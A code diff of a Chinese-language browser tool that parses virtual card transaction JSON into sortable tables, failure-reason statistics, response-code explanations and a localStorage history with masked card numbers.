+/* ================= 主入口 ================= */
 function generateTable() {
-  let input = document.getElementById('jsonInput').value;
-  if(!input) { alert("请先输入 JSON 数据 / Please input JSON"); return; }
-  
-  const originalInput = input; 
+  let input = document.getElementById('jsonInput').value.trim();
+  if(!input) { 
+    alert("请先输入 JSON 数据"); 
+    return; 
+  }
 
   try {
     let json = JSON.parse(input);
-    let list = json.data?.list || json.list || json; 
+    let list = json.data?.list || json.list || json;
 
     if(!Array.isArray(list)) { 
-        alert("JSON 格式不正确，未找到有效的交易列表 (data.list 或 list) / Invalid JSON: No valid transaction list found."); 
-        return; 
+      alert("JSON 格式不正确，未找到有效的交易列表"); 
+      return; 
     }
     
     rawList = list;
-    saveHistory(rawList, originalInput); 
+    saveHistory(rawList, input);
     
     extractFields(rawList);
-    currentSortField = null; 
+    currentSortField = null;
     currentSortOrder = 'asc';
     renderTable(rawList);
-    renderSummary(rawList);
-    const vcc = rawList?.[0]?.virtual_card_number || "Unknown VCC";
-    barkPush(vcc);
+    renderStats(rawList);
   } catch(e) {
-    alert("JSON 解析失败 / JSON Parse Error: " + e.message);
+    alert("JSON 解析失败: " + e.message);
   }
 }
 
-/* ================= 汇总统计 (展示错误详情) ================= */
-function renderSummary(list) {
+/* ================= 统计渲染 ================= */
+function renderStats(list) {
   const total = list.length;
   const isApproved = (r) => r.issuer_response && r.issuer_response.toLowerCase().includes("approved");
   
   const successList = list.filter(isApproved);
-  const failList  = list.filter(r => !isApproved(r));
+  const failList = list.filter(r => !isApproved(r));
 
-  /* 1. 总览 */
-  document.getElementById('statTotal').innerHTML = `
-    总刷卡 <b>${total}</b> 次，成功 <b style="color:green">${successList.length}</b> 次，失败 <b style="color:#b71c1c">${failList.length}</b> 次
-  `;
+  document.getElementById('statTotal').textContent = total;
+  document.getElementById('statSuccess').textContent = successList.length;
+  document.getElementById('statFail').textContent = failList.length;
 
-  /* 2. 失败原因 */
+  // 失败原因统计
   const failMap = {};
   failList.forEach(r => {
     const reason = r.in_control_response || '未返回原因';
     failMap[reason] = (failMap[reason] || 0) + 1;
   });
+
   const failArr = Object.entries(failMap).sort((a, b) => b[1] - a[1]);
   
-  // ****** 将列表转换为表格 ******
-  let tableHtml = '<table class="fail-summary-table">';
-  tableHtml += '<thead><tr><th>失败代码 / 失败原因</th><th style="width: 80px;">次数</th><th>中文描述 / 英文解释</th></tr></thead>';
-  tableHtml += '<tbody>';
-  let copyTextArray = [];
-
-  failArr.forEach(([k, v]) => {
-      let fullEntry = IN_CONTROL_RESPONSES[k] || IN_CONTROL_RESPONSES['未返回原因'];
-      
-      // 拆分：[中文名称, 英文描述, 中文描述]
-      const parts = fullEntry.split(' | ');
-      
-      let chineseName     = parts[0]; 
-      let englishComment = parts.length > 1 ? parts[1].trim() : '';
-      let chineseComment = parts.length > 2 ? parts[2].trim() : '';
-      
-      // 表格内容行
-      tableHtml += `<tr>`;
-      tableHtml += `<td>【${k}】: ${chineseName}</td>`;
-      tableHtml += `<td>${v}</td>`;
-      tableHtml += `<td>${chineseComment ? chineseComment + '<br>' : ''}(${englishComment})</td>`;
-      tableHtml += `</tr>`;
-      
-      // 复制内容
-      copyTextArray.push(`【${chineseName}】(${v}次)`); 
+  let failHtml = '';
+  failArr.slice(0, 10).forEach(([reason, count]) => {
+    const fullExplanation = IN_CONTROL_RESPONSES[reason] || reason;
+    const parts = fullExplanation.split(' | ');
+    const chineseName = parts[0] || reason;
+    const englishDesc = parts.length > 1 ? parts[1] : '';
+    const chineseDesc = parts.length > 2 ? parts[2] : '';
+    
+    failHtml += `
+      <div class="fail-item">
+        <div class="fail-item-header">
+          <div class="fail-code">${reason}</div>
+          <div class="fail-count">${count}</div>
+        </div>
+        <div class="fail-name">${chineseName}</div>
+        ${englishDesc ? `<div class="fail-desc fail-desc-en">${englishDesc}</div>` : ''}
+        ${chineseDesc ? `<div class="fail-desc fail-desc-cn">${chineseDesc}</div>` : ''}
+      </div>
+    `;
   });
-  tableHtml += '</tbody></table>';
 
-  const summaryCopyText = copyTextArray.join('、');
-
-  document.getElementById('statFailReason').innerHTML = `
-    <div class="fail-reason">${tableHtml}</div>
-    <button class="copy-btn" onclick="copyText('${summaryCopyText.replace(/'/g,"\\'")}')">复制失败原因汇总</button>
-  `;
-
-  document.getElementById('summary').style.display = 'block';
-}
-
-/* ================= 一键复制 ================= */
-function copyText(txt) {
-  const ta = document.createElement('textarea');
-  ta.value = txt;
-  ta.style.position = 'fixed'; 
-  document.body.appendChild(ta);
-  ta.select();
-  document.execCommand('copy');
-  document.body.removeChild(ta);
-  alert('已复制到剪贴板');
+  document.getElementById('failReasons').innerHTML = failHtml;
+  document.getElementById('statsPanel').classList.add('show');
 }
 
 /* ================= 字段提取 ================= */
 function extractFields(list) {
-  const mainFields = ["index","txn_date_time","virtual_card_number","merchant_name","merchant_amount","merchant_currency_code","txn_type","issuer_response","in_control_response","approval_code", "billing_amount", "billing_currency_code"];
+  const mainFields = ["index","txn_date_time","virtual_card_number","merchant_name","merchant_amount","merchant_currency_code","txn_type","issuer_response","in_control_response","approval_code","billing_amount","billing_currency_code"];
   let fieldSet = new Set();
   
   list.forEach(item => Object.keys(item).forEach(k => fieldSet.add(k)));
   
   allFields = mainFields.filter(f => f === "index" || fieldSet.has(f));
-  
   fieldSet.forEach(f => { if(!allFields.includes(f)) allFields.push(f); });
   
   allFields = allFields.map(f => {
-    const cn = fieldLabels[f] || null;
-    return { key: f, label: cn ? `${f} / ${cn}` : f };
+    let label = fieldLabels[f];
+    // 如果没有定义，自动生成中英文格式
+    if (!label) {
+      label = `${f} / ${f}`;
+    }
+    return {
+      key: f,
+      label: label,
+      tooltip: fieldTooltips[f] || ""
+    };
   });
 }
 
-/* ================= 表格渲染（添加 Tooltip 和修复序号计算） ================= */
+/* ================= 表格渲染 ================= */
 function renderTable(list) {
-  // 1. 创建未排序的、时间正序的列表作为原始基准 (最早的交易在 index 0)
-  const baseList = list.slice().reverse(); 
+  const wrapper = document.getElementById('tableWrapper');
+  
+  if (list.length === 0) {
+    wrapper.innerHTML = `
+      <div class="empty-state">
+        <div class="empty-icon">📊</div>
+        <div>暂无数据</div>
+      </div>
+    `;
+    return;
+  }
 
-  // 2. 创建用于渲染的排序列表
-  let sortedList = list.slice().reverse(); 
+  const baseList = list.slice().reverse();
+  let sortedList = list.slice().reverse();
 
-  // --- 排序逻辑 ---
+  // 排序
   if(currentSortField) {
     sortedList.sort((a,b) => {
       let valA = a[currentSortField] ?? '';
@@ -430,124 +923,101 @@ function renderTable(list) {
     });
   }
 
-  // --- 渲染表头 ---
-  const thead = document.getElementById('tableHead');
+  // 渲染表头
   let theadHtml = '<tr>';
   allFields.forEach(f => {
-    const sortClass = f.key === currentSortField 
-      ? `sorted-${currentSortOrder}` 
-      : '';
+    const sortClass = f.key === currentSortField ? `sorted-${currentSortOrder}` : '';
     const onClick = f.key !== 'index' ? `onclick="sortTable('${f.key}')"` : '';
+    const helpIcon = f.tooltip 
+      ? `<span class="help-icon" onclick="event.stopPropagation(); showTooltip('${f.key}', '${f.label}', '${f.tooltip.replace(/'/g, "\\'")}')">?</span>` 
+      : '';
 
-    theadHtml += `<th class="${sortClass}" ${onClick}>
-                    <span>${f.label.replace(' / ','<br>')}</span>
-                  </th>`;
+    // 分离中英文，换行显示
+    const parts = f.label.split(' / ');
+    const englishPart = parts[0] || '';
+    const chinesePart = parts[1] || '';
+    const labelHtml = `<div style="line-height: 1.2;">
+      <div style="font-size: 9px; color: #6c757d;">${englishPart}</div>
+      <div style="font-size: 11px; font-weight: 600; margin-top: 2px;">${chinesePart}</div>
+    </div>`;
+
+    theadHtml += `<th class="${sortClass}" ${onClick}>${labelHtml}${helpIcon}</th>`;
   });
   theadHtml += '</tr>';
-  thead.innerHTML = theadHtml;
 
-
-  // --- 渲染表格体 ---
-  const tbody = document.getElementById('tableBody');
+  // 渲染表体
   let tbodyHtml = '';
-  
-  sortedList.forEach((item, index) => {
-    // 确定行样式
+  sortedList.forEach((item) => {
     const isApproved = item["issuer_response"] && item["issuer_response"].toLowerCase().includes("approved");
     const rowClass = isApproved ? "success" : (item["issuer_response"] ? "fail" : "");
     
-    // 修复序号：使用 indexOf 查找对象引用在原始时间正序列表中的位置
-    const originalTimeIndex = baseList.indexOf(item); 
-    const displayIndex = originalTimeIndex !== -1 ? originalTimeIndex + 1 : '-'; 
+    const originalTimeIndex = baseList.indexOf(item);
+    const displayIndex = originalTimeIndex !== -1 ? originalTimeIndex + 1 : '-';
 
     let rowHtml = `<tr class="${rowClass}">`;
     
     allFields.forEach(f => {
-      let content = "";
-      let cellAttributes = ""; 
-
-      if(f.key === 'index') {
-        content = displayIndex; 
-      } else {
-        content = item[f.key] ?? "";
-
-        // ****** 鼠标悬停解释逻辑 ******
-        if (f.key === 'in_control_response' && content) {
-            const fullExplanation = IN_CONTROL_RESPONSES[content] || IN_CONTROL_RESPONSES['未返回原因'];
-            // Tooltip 展示完整的 中文名称 | 英文描述 | 中文描述
-            // 使用 \n\n 代替 | 分隔符，使 Tooltip 换行更易读
-            cellAttributes = `title="${fullExplanation.replace(/"/g, '&quot;').replace(/ \| /g, '\n\n')}"`; 
-        }
-        // ********************************
-      }
-      
-      rowHtml += `<td ${cellAttributes}>${content}</td>`;
+      let content = f.key === 'index' ? displayIndex : (item[f.key] ?? "");
+      rowHtml += `<td>${content}</td>`;
     });
     rowHtml += '</tr>';
     tbodyHtml += rowHtml;
   });
-  
-  tbody.innerHTML = tbodyHtml; 
+
+  wrapper.innerHTML = `
+    <table>
+      <thead>${theadHtml}</thead>
+      <tbody>${tbodyHtml}</tbody>
+    </table>
+  `;
 }
 
 function sortTable(field) {
-  if (field === 'index') {
-    return;
-  }
-  
-  document.querySelectorAll('#tableHead th').forEach(th => {
-      th.classList.remove('sorted-asc', 'sorted-desc');
-  });
+  if (field === 'index') return;
 
-  if(currentSortField === field) currentSortOrder = currentSortOrder === 'asc' ? 'desc' : 'asc';
-  else { currentSortField = field; currentSortOrder = 'asc'; }
-  
-  const ths = document.getElementById('tableHead').getElementsByTagName('th');
-  for (let i = 0; i < allFields.length; i++) {
-    if (allFields[i].key === field) {
-        ths[i].classList.add(`sorted-${currentSortOrder}`);
-        break;
-    }
+  if(currentSortField === field) {
+    currentSortOrder = currentSortOrder === 'asc' ? 'desc' : 'asc';
+  } else {
+    currentSortField = field;
+    currentSortOrder = 'asc';
   }
 
   renderTable(rawList);
 }
 
-/* ================= 历史记录：更新下拉菜单 (已移除日期筛选逻辑) ================= */
+/* ================= 历史记录 ================= */
 function updateHistorySelect() {
   const history = JSON.parse(localStorage.getItem('vccHistory') || '[]');
   const select = document.getElementById('historySelect');
   
-  // 清空并添加默认选项
-  select.innerHTML = '<option value="">选择历史记录 / Select History</option>';
+  select.innerHTML = '<option value="">选择记录</option>';
   
-  const isApproved = (r) => r.issuer_response && r.issuer_response.toLowerCase().includes("approved");
+  const isApproved = (r) => r.in_control_response === 'Approval';
 
-  // 倒序遍历历史记录
   history.slice().reverse().forEach((item, originalIdx) => {
     const idx = history.length - 1 - originalIdx;
-    
-    // ** 移除日期筛选逻辑，显示所有历史记录 **
-    
     const opt = document.createElement('option');
     opt.value = idx;
 
-    const total   = item.data.length;
+    const total = item.data.length;
     const success = item.data.filter(isApproved).length;
-    const fail    = total - success;
+    const fail = total - success;
+    
+    // 提取主要卡号（出现次数最多的）
+    const cardMap = {};
+    item.data.forEach(record => {
+      const card = record.virtual_card_number || record.real_card_alias || '未知';
+      cardMap[card] = (cardMap[card] || 0) + 1;
+    });
+    const mainCard = Object.entries(cardMap).sort((a, b) => b[1] - a[1])[0]?.[0] || '未知';
+    
+    // 卡号脱敏：保留前4后4位
+    const maskedCard = mainCard.length > 8 
+      ? `${mainCard.slice(0, 4)}****${mainCard.slice(-4)}`
+      : mainCard;
 
-    opt.text = `${item.timestamp} - ${item.vcc} （成功${success}/失败${fail}）`;
-
-    if (success === total)       opt.classList.add('all-success');
-    else if (fail === total)     opt.classList.add('all-fail');
-    else {
-      const ratio = success / total;   
-      const r = Math.round(255 * (1 - ratio));
-      const g = Math.round(255 * ratio);
-      opt.style.backgroundColor = `rgb(${r},${g},150)`; 
-      opt.style.color = ratio > 0.5 ? '#155724' : '#721c24';
-    }
-
+    // 格式：时间 | 卡号 | 成功 x 失败 x
+    opt.text = `${item.timestamp} | ${maskedCard} | ✓${success} ✗${fail}`;
     select.appendChild(opt);
   });
 }
@@ -555,52 +1025,240 @@ function updateHistorySelect() {
 function saveHistory(list, originalJson) {
   let history = JSON.parse(localStorage.getItem('vccHistory') || '[]');
   
-  // 确保时间戳格式统一，方便日期筛选
   const now = new Date();
-  const datePart = `${now.getFullYear()}/${now.getMonth() + 1}/${now.getDate()}`;
-  const timePart = now.toLocaleTimeString();
-  const timestamp = `${datePart} ${timePart}`;
+  const timestamp = `${now.getMonth() + 1}/${now.getDate()} ${now.getHours()}:${String(now.getMinutes()).padStart(2, '0')}`;
   
-  const vcc = list[0]?.virtual_card_number || "未知VCC";
-  history.push({ timestamp, vcc, data: list, originalJson: originalJson }); 
+  const vcc = list[0]?.virtual_card_number || "未知";
+  history.push({ timestamp, vcc, data: list, originalJson });
+  
   if (history.length > 20) {
     history = history.slice(history.length - 20);
   }
+  
   localStorage.setItem('vccHistory', JSON.stringify(history));
   updateHistorySelect();
 }
 
-/* ================= 历史记录：加载 (还原输入框数据) ================= */
 function loadHistory() {
   const select = document.getElementById('historySelect');
-  const input = document.getElementById('jsonInput'); 
   const index = select.value;
   if(index === "") return;
+  
   const history = JSON.parse(localStorage.getItem('vccHistory') || '[]');
   
   if(history[index]) {
-    currentSortField = null; 
-    currentSortOrder = 'asc';
-    
-    // 还原原始 JSON 字符串到输入框
-    input.value = history[index].originalJson || `// 警告: 历史记录数据丢失原始 JSON，无法还原。加载时间: ${history[index].timestamp}`;
-    
+    document.getElementById('jsonInput').value = history[index].originalJson || '';
     rawList = history[index].data;
     extractFields(rawList);
+    currentSortField = null;
+    currentSortOrder = 'asc';
     renderTable(rawList);
-    renderSummary(rawList);
+    renderStats(rawList);
   }
 }
 
 function clearHistory() {
-  if(confirm('确认清空历史记录吗？ / Clear all history?')) {
+  if(confirm('确认清空历史记录？')) {
     localStorage.removeItem('vccHistory');
     updateHistorySelect();
-    document.getElementById('tableBody').innerHTML = "";
-    document.getElementById('tableHead').innerHTML = "";
-    document.getElementById('summary').style.display = 'none';
+    document.getElementById('tableWrapper').innerHTML = `
+      <div class="empty-state">
+        <div class="empty-icon">📊</div>
+        <div>请在左侧粘贴 JSON 数据并点击"解析数据"</div>
+      </div>
+    `;
+    document.getElementById('statsPanel').classList.remove('show');
   }
 }
+
+/* ================= 提示弹窗 ================= */
+function showTooltip(fieldKey, fieldLabel, tooltipText) {
+  document.getElementById('tooltipHeader').textContent = fieldLabel;
+  document.getElementById('tooltipContent').textContent = tooltipText;
+  document.getElementById('tooltipModal').classList.add('show');
+  document.getElementById('tooltipOverlay').classList.add('show');
+}
+
+function showFailDetail(reason) {
+  const fullExplanation = IN_CONTROL_RESPONSES[reason] || reason;
+  const parts = fullExplanation.split(' | ');
+  
+  const chineseName = parts[0] || '';
+  const englishDesc = parts.length > 1 ? parts[1] : '';
+  const chineseDesc = parts.length > 2 ? parts[2] : '';
+  
+  let content = '';
+  if (chineseName) {
+    content += `<div class="tooltip-section">
+      <div class="tooltip-label">失败原因：</div>
+      <div>${chineseName}</div>
+    </div>`;
+  }
+  if (englishDesc) {
+    content += `<div class="tooltip-section">
+      <div class="tooltip-label">English Description:</div>
+      <div>${englishDesc}</div>
+    </div>`;
+  }
+  if (chineseDesc) {
+    content += `<div class="tooltip-section">
+      <div class="tooltip-label">中文说明：</div>
+      <div>${chineseDesc}</div>
+    </div>`;
+  }
+  
+  document.getElementById('tooltipHeader').textContent = `${reason}`;
+  document.getElementById('tooltipContent').innerHTML = content;
+  document.getElementById('tooltipModal').classList.add('show');
+  document.getElementById('tooltipOverlay').classList.add('show');
+}
+
+function showResponseCodes() {
+  let content = '';
+  
+  // In Control 响应代码
+  content += `<div class="tooltip-section">
+    <div class="tooltip-label">In Control 响应代码</div>
+    <table class="code-table">
+      <thead>
+        <tr>
+          <th style="width: 200px;">代码</th>
+          <th>说明</th>
+        </tr>
+      </thead>
+      <tbody>`;
+  
+  Object.entries(IN_CONTROL_RESPONSES).forEach(([code, explanation]) => {
+    const parts = explanation.split(' | ');
+    const chineseName = parts[0] || '';
+    const englishDesc = parts.length > 1 ? parts[1] : '';
+    const chineseDesc = parts.length > 2 ? parts[2] : '';
+    
+    content += `
+      <tr>
+        <td><div class="code-name">${code}</div></td>
+        <td>
+          <div class="code-name">${chineseName}</div>
+          ${englishDesc ? `<div class="code-en">${englishDesc}</div>` : ''}
+          ${chineseDesc ? `<div class="code-cn">${chineseDesc}</div>` : ''}
+        </td>
+      </tr>`;
+  });
+  
+  content += `
+      </tbody>
+    </table>
+  </div>`;
+  
+  // 发卡行响应代码
+  content += `<div class="tooltip-section">
+    <div class="tooltip-label">发卡行响应代码 (Issuer Response)</div>
+    <table class="code-table">
+      <thead>
+        <tr>
+          <th style="width: 200px;">代码</th>
+          <th>说明</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td><div class="code-name">Approved</div></td>
+          <td>
+            <div class="code-name">批准</div>
+            <div class="code-en">Transaction approved by the issuer.</div>
+            <div class="code-cn">交易已被发卡机构批准。</div>
+          </td>
+        </tr>
+        <tr>
+          <td><div class="code-name">Do not honor</div></td>
+          <td>
+            <div class="code-name">不予承兑</div>
+            <div class="code-en">Generic decline by the issuer. No specific reason provided.</div>
+            <div class="code-cn">发卡机构通用拒绝。未提供具体原因。</div>
+          </td>
+        </tr>
+        <tr>
+          <td><div class="code-name">Insufficient funds</div></td>
+          <td>
+            <div class="code-name">余额不足</div>
+            <div class="code-en">Account does not have sufficient funds to complete the transaction.</div>
+            <div class="code-cn">账户余额不足以完成交易。</div>
+          </td>
+        </tr>
+        <tr>
+          <td><div class="code-name">Invalid card number</div></td>
+          <td>
+            <div class="code-name">无效卡号</div>
+            <div class="code-en">Card number is invalid or not recognized.</div>
+            <div class="code-cn">卡号无效或未被识别。</div>
+          </td>
+        </tr>
+        <tr>
+          <td><div class="code-name">Expired card</div></td>
+          <td>
+            <div class="code-name">卡片过期</div>
+            <div class="code-en">Card has expired and cannot be used.</div>
+            <div class="code-cn">卡片已过期，无法使用。</div>
+          </td>
+        </tr>
+        <tr>
+          <td><div class="code-name">Invalid transaction</div></td>
+          <td>
+            <div class="code-name">无效交易</div>
+            <div class="code-en">Transaction type not allowed for this card.</div>
+            <div class="code-cn">该卡不允许此类型交易。</div>
+          </td>
+        </tr>
+        <tr>
+          <td><div class="code-name">Lost card</div></td>
+          <td>
+            <div class="code-name">卡片挂失</div>
+            <div class="code-en">Card has been reported as lost.</div>
+            <div class="code-cn">卡片已被报告为挂失。</div>
+          </td>
+        </tr>
+        <tr>
+          <td><div class="code-name">Stolen card</div></td>
+          <td>
+            <div class="code-name">卡片被盗</div>
+            <div class="code-en">Card has been reported as stolen.</div>
+            <div class="code-cn">卡片已被报告为被盗。</div>
+          </td>
+        </tr>
+        <tr>
+          <td><div class="code-name">Exceeds withdrawal limit</div></td>
+          <td>
+            <div class="code-name">超出取款限额</div>
+            <div class="code-en">Transaction amount exceeds the card's withdrawal limit.</div>
+            <div class="code-cn">交易金额超出卡片的取款限额。</div>
+          </td>
+        </tr>
+        <tr>
+          <td><div class="code-name">Restricted card</div></td>
+          <td>
+            <div class="code-name">卡片受限</div>
+            <div class="code-en">Card has been restricted by the issuer.</div>
+            <div class="code-cn">卡片已被发卡机构限制。</div>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+  </div>`;
+  
+  document.getElementById('tooltipHeader').textContent = '响应代码说明';
+  document.getElementById('tooltipContent').innerHTML = content;
+  document.getElementById('tooltipModal').classList.add('show');
+  document.getElementById('tooltipOverlay').classList.add('show');
+}
+
+function closeTooltip() {
+  document.getElementById('tooltipModal').classList.remove('show');
+  document.getElementById('tooltipOverlay').classList.remove('show');
+}
+
+document.addEventListener('keydown', function(e) {
+  if (e.key === 'Escape') closeTooltip();
+});
 
 /* ================= 启动 ================= */
 updateHistorySelect();
